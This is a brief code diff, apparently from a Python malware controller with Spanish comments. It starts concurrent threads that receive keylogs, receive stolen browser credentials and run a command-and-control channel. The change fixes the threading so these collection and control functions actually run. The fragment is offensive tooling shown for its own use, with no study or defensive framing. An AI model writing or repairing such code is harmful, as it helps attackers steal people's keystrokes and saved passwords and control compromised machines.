@@ -32,15 +32,15 @@ def main():
     banner()
 
     # Hilo 1 de keylogs
-    thread_1 = threading.Thread(target=recv_keys.main())
+    thread_1 = threading.Thread(target=recv_keys.main)
     thread_1.start()
 
     # Hilo 3 de credenciales de navegadores
-    thread_2 = threading.Thread(target=recv_cred.main())
+    thread_2 = threading.Thread(target=recv_cred.main)
     thread_2.start()
 
     # Hilo 2 comand & control
-    thread_3 = threading.Thread(target=cmd_cntr.start())
+    thread_3 = threading.Thread(target=cmd_cntr.start)
     thread_3.start()
 
     # Juntamos los hilos para su posterior detención.
